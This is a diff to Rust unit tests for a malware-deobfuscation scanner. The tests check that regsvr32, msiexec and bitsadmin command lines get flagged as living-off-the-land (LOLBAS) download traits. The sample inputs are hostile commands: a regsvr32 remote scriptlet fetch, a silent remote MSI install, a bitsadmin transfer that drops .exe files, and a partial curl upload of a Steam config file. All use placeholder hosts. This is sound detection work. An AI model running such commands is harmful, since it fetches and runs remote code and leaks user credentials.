@@ -13162,6 +13162,13 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
             "process URL argument double-emitted as generic: {:?}",
             env.traits
         );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == "regsvr32")),
+            "generic process URL argument mislabeled as regsvr32 LOLBAS: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -13190,10 +13197,8 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     fn regsvr32_scriptlet_url_argument_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "http://regsvr32-scriptlet.example/payload.sct";
-        crate::deob_scan::scan_deob_text(
-            &format!(r#"regsvr32 /s /n /u /i:{url} scrobj.dll"#),
-            &mut env,
-        );
+        let line = format!(r#"regsvr32 /s /n /u /i:{url} scrobj.dll"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
                 Trait::UrlArgument { url: got, .. } if got == url
@@ -13205,6 +13210,16 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                 .iter()
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "regsvr32 scriptlet URL double-emitted as generic: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Lolbas { name, cmd } if name == "regsvr32" && cmd == &line
+                )
+            }),
+            "regsvr32 scriptlet URL missing LOLBAS provenance in deob text: {:?}",
             env.traits
         );
     }
@@ -13280,7 +13295,8 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     fn msiexec_url_package_argument_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://msiexec-package.example/setup.msi";
-        crate::deob_scan::scan_deob_text(&format!(r#"msiexec /quiet /i "{url}""#), &mut env);
+        let line = format!(r#"msiexec /quiet /i "{url}""#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
                 Trait::UrlArgument { url: got, .. } if got == url
@@ -13292,6 +13308,16 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                 .iter()
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "msiexec package URL double-emitted as generic: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Lolbas { name, cmd } if name == "msiexec" && cmd == &line
+                )
+            }),
+            "msiexec package URL missing LOLBAS provenance in deob text: {:?}",
             env.traits
         );
     }
@@ -13649,10 +13675,8 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     #[test]
     fn bitsadmin_transfer_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
-        crate::deob_scan::scan_deob_text(
-            r#"BiTsAdMiN /TrAnSfEr j1 /DoWnLoAd /PrIoRiTy foreground "hTtPs://bits.example/a.txt" "C:\Temp\a.exe" "hTtPs://bits.example/b.txt" "C:\Temp\b.exe""#,
-            &mut env,
-        );
+        let line = r#"BiTsAdMiN /TrAnSfEr j1 /DoWnLoAd /PrIoRiTy foreground "hTtPs://bits.example/a.txt" "C:\Temp\a.exe" "hTtPs://bits.example/b.txt" "C:\Temp\b.exe""#;
+        crate::deob_scan::scan_deob_text(line, &mut env);
         for expected in ["https://bits.example/a.txt", "https://bits.example/b.txt"] {
             let has = env.traits.iter().any(|t| {
                 matches!(t,
@@ -13673,6 +13697,16 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
         assert_eq!(
             generic_count, 0,
             "bitsadmin URLs double-emitted: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Lolbas { name, cmd } if name == "bitsadmin" && cmd == line
+                )
+            }),
+            "bitsadmin transfer missing LOLBAS provenance in deob text: {:?}",
             env.traits
         );
     }
